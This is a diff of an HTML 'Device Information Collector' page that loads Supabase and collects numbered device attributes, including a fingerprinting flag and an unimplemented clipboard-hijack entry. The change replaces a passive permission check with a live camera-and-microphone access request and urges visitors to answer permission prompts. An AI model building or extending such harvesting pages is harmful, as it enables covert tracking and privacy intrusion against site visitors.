@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Information Collector v2</title>
+    <title>Device Information Collector v3</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Supabase Client Library -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
@@ -20,7 +20,7 @@
             <path stroke-linecap="round" stroke-linejoin="round" d="M7.864 4.243A7.5 7.5 0 0119.5 12c0 2.42-.944 4.626-2.47 6.314M12 9.75v3.75m0-10.5a7.5 7.5 0 01-7.5 7.5c-2.42 0-4.626-.944-6.314-2.47m14.263-1.031L12 12.001" />
         </svg>
         <h1 class="mt-4 text-2xl font-bold tracking-tight text-white sm:text-3xl">Data Collection in Progress</h1>
-        <p class="mt-4 text-gray-400">Your device information is being securely collected. Thank you for your participation.</p>
+        <p class="mt-4 text-gray-400">Your device information is being securely collected. Please respond to any permission prompts.</p>
         <div id="status" class="mt-6 p-3 bg-gray-700 rounded-lg text-indigo-300 font-mono text-sm">
             Initializing...
         </div>
@@ -147,20 +147,26 @@
                 // 18. Clipboard Hijack - NOTE: Not implemented as it's a malicious action.
                 data.clipboard_hijack = false;
 
-                // 19. Webcam & Mic Access (Permissions Check)
-                updateStatus('Checking permissions...');
+                // 19. Webcam & Mic Access (Requesting Access)
+                updateStatus('Requesting camera & microphone access...');
                 try {
-                    const webcam_permission = await navigator.permissions.query({ name: 'camera' });
-                    // FIX: Convert permission state string ('granted', 'prompt', 'denied') to a boolean
-                    data.webcam_access = webcam_permission.state === 'granted'; 
+                    // This will trigger a permission prompt for the user.
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                     
-                    const mic_permission = await navigator.permissions.query({ name: 'microphone' });
-                    // FIX: Convert permission state string to a boolean
-                    data.microphone_access = mic_permission.state === 'granted';
+                    // If we get here, the user granted access.
+                    data.webcam_access = true;
+                    data.microphone_access = true;
+
+                    // It's good practice to stop the tracks immediately if we just need to check for access.
+                    stream.getTracks().forEach(track => track.stop());
+                    updateStatus('Camera & microphone access granted.');
+
                 } catch (e) {
-                    // FIX: Default to false if permission API is unsupported or fails
+                    // User denied permission or an error occurred (e.g., no devices found).
+                    console.error('Could not get media device access:', e.name);
                     data.webcam_access = false;
                     data.microphone_access = false;
+                    updateStatus('Camera & microphone access denied.');
                 }
 
                 // 20. Fingerprinting Flag
